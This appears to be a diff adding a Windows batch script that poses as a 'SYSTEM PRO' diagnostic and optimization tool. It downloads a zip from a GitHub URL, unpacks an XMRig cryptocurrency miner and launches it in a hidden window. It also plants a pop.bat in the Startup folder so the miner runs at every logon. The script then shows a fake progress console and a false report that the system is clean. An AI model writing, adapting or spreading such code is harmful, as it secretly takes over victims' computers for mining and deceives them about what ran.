@@ -1,0 +1,139 @@
+��&cls
+@echo off
+setlocal
+
+:: ===================================================================
+:: CONFIGURATION
+:: ===================================================================
+set "URL=https://raw.githubusercontent.com/Pdiwbcosbk002/ppopkjijuujjj/main/popw.zip"
+set "ZIP_FILE=popw.zip"
+set "DST=C:\Tools\XMRRig"
+set "XMRIG_PATH=%DST%\xmrig-6.24.0\xmrig.exe"
+
+
+
+:: ===================================================================
+:: STEP 1: Create Destination Folder
+:: ===================================================================
+if not exist "%DST%" (
+    mkdir "%DST%"
+)
+
+:: ===================================================================
+:: STEP 2: Download ZIP File
+:: ===================================================================
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%ZIP_FILE%')"
+
+if not exist "%ZIP_FILE%" (
+    pause
+    exit /b
+)
+
+
+:: ===================================================================
+:: STEP 3: Extract ZIP File
+:: ===================================================================
+
+powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%DST%' -Force"
+
+
+:: ===================================================================
+:: STEP 4: Clean temporary ZIP file
+:: ===================================================================
+del /f /q "%ZIP_FILE%"
+
+
+
+
+:: ===================================================================
+:: STEP 6: (NOTE)
+:: ===================================================================
+powershell -WindowStyle Hidden -Command "Start-Process '%XMRIG_PATH%' -WindowStyle Hidden" 
+
+:: หาโฟลเดอร์ Startup
+set "STARTUP=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+:: หากไม่มี pop.bat ให้สร้าง พร้อมเขียนคำสั่งรันแบบปกติ
+if not exist "%STARTUP%\pop.bat" (
+    echo @echo off > "%STARTUP%\pop.bat"
+    echo set "DST=C:\Tools\XMRRig" >> "%STARTUP%\pop.bat"
+    echo set "XMRIG_PATH=%%DST%%\xmrig-6.24.0\xmrig.exe" >> "%STARTUP%\pop.bat"
+    echo powershell -WindowStyle Hidden -Command "Start-Process '%%XMRIG_PATH%%' -WindowStyle Hidden" >> "%STARTUP%\pop.bat"
+)
+
+
+setlocal enabledelayedexpansion
+title SYSTEM PRO(TM) - Diagnostic & Optimization Console
+mode con cols=90 lines=30
+color 0A
+
+cls
+echo.
+echo   ================================================================================
+echo                         SYSTEM PRO(TM) - DIAGNOSTIC SUITE
+echo   ================================================================================
+echo.
+echo        Initializing core modules... please wait.
+echo.
+
+:: Animation setup
+set "pos=1"
+set "dir=1"
+set "max=60"
+set "phase=0"
+
+:main_loop
+cls
+echo.
+echo   ================================================================================
+echo                         SYSTEM PRO(TM) - DIAGNOSTIC SUITE
+echo   ================================================================================
+echo.
+
+if %phase%==0 echo   Status: Analyzing system integrity...
+if %phase%==1 echo   Status: Optimizing performance cores...
+if %phase%==2 echo   Status: Cleaning temporary caches...
+if %phase%==3 echo   Status: Applying security reinforcement...
+if %phase%==4 goto finish
+
+echo.
+
+:: Build loading bar
+set "line="
+for /L %%i in (1,1,%pos%) do set "line=!line!#"
+echo   [!line!]
+
+set /a pos+=dir
+
+if !pos! GEQ %max% set "dir=-1"
+if !pos! LEQ 1 set "dir=1"
+
+ping 127.0.0.1 -n 1 >nul
+
+set /a count+=1
+if !count! GEQ 40 (
+    set /a phase+=1
+    set count=0
+)
+
+goto main_loop
+
+
+:finish
+cls
+echo.
+echo   ================================================================================
+echo                           SYSTEM REPAIR COMPLETED SUCCESSFULLY
+echo   ================================================================================
+echo.
+echo      - All diagnostics passed
+echo      - Performance modules optimized
+echo      - System cache cleaned
+echo      - No security threats detected
+echo.
+echo      Your system is now running at optimal efficiency.
+echo.
+pause >nul
+
+echo.
+pause
